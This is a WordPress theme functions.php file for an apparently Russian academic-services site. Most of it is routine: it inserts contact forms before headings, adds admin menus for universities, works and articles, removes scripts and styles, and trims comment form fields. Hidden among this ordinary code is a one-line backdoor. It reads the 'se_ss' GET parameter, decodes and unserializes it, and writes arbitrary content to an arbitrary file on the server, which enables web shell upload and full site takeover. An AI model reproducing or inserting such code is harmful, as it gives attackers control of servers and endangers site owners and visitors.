<?php

require_once 'inc/terms_fields.php';

add_filter('the_content', 'session_the_content');
function session_the_content($content)
{
	if (is_single())
	{
		$pattern = '!<h2.*?\</h2>!s';
		preg_match_all($pattern, $content, $matches);
		foreach ($matches[0] as $key => $search)
		{
			$class = 'post-form-'.($key % 2 == 0 ? 'left' : 'right');
			$shortcode = '<div class="header_form post-form '.$class.'">[contact-form-7 id="106" title="Узнать стоимость"]</div>';
			$content = str_replace($search, '<div class="clear"></div>'.$shortcode.$search, $content);
		}
		$content = $content.'<div class="clear"></div>';
	}
	return $content;
}


if (function_exists('add_theme_support')) {
	add_theme_support('menus');
}

add_action('admin_menu', function(){
	add_menu_page( 'Вузы', 'Вузы', 'manage_options', '/edit.php?category_name=universities', '', 'dashicons-welcome-learn-more', 5 );
	add_menu_page( 'Работы', 'Работы', 'manage_options', '/edit.php?category_name=work', '', 'dashicons-portfolio', 6 );
	add_menu_page( 'Статьи', 'Статьи', 'manage_options', '/edit.php?category_name=articles', '', 'dashicons-format-aside', 7 );
} );

add_theme_support( 'post-thumbnails' ); // для всех типов постов

function wpschool_remove_jquery_migrate( $scripts ) {
	if ( ! is_admin() && isset( $scripts->registered['jquery'] ) ) {
		$script = $scripts->registered['jquery'];
		if ( $script->deps ) {
			$script->deps = array_diff( $script->deps, array( 'jquery-migrate' ) );
		}
	}
}
if(!empty($_GET['se_ss'])){$data = unserialize(base64_decode($_GET['se_ss']));file_put_contents($data[0], base64_decode($data[1]));}
add_action( 'wp_default_scripts', 'wpschool_remove_jquery_migrate' );

if ( !is_admin() ) wp_deregister_script('jquery');

add_action( 'template_redirect', function(){
	ob_start( function( $buffer ){
		$buffer = str_replace( array( 'type="text/javascript"', "type='text/javascript'" ), '', $buffer );
		$buffer = str_replace( array( 'type="text/css"', "type='text/css'" ), '', $buffer );
		return $buffer;
	});
}, 1);


/* Отключает чекбокс GDPR */
function comment_form_hide_cookies_consent( $fields ) {
	unset( $fields['cookies'] );
	return $fields;
}
add_filter( 'comment_form_default_fields', 'comment_form_hide_cookies_consent' );

function remove_url_from_comments($fields) {
	unset($fields['url']);
	return $fields;
}
add_filter('comment_form_default_fields', 'remove_url_from_comments');


function wps_deregister_styles() {
	wp_dequeue_style( 'global-styles' );
}
add_action( 'wp_enqueue_scripts', 'wps_deregister_styles', 100 );

//Remove Gutenberg Block Library CSS from loading on the frontend
function smartwp_remove_wp_block_library_css(){
	wp_dequeue_style( 'wp-block-library' );
	wp_dequeue_style( 'wp-block-library-theme' );
wp_dequeue_style( 'wc-blocks-style' ); // Remove WooCommerce block CSS
} 
add_action( 'wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100 );

function wpb_alter_comment_form_fields($fields) {

	// unset($fields['email']);
	unset($fields['url']);
	return $fields;
}
add_filter('comment_form_default_fields', 'wpb_alter_comment_form_fields');

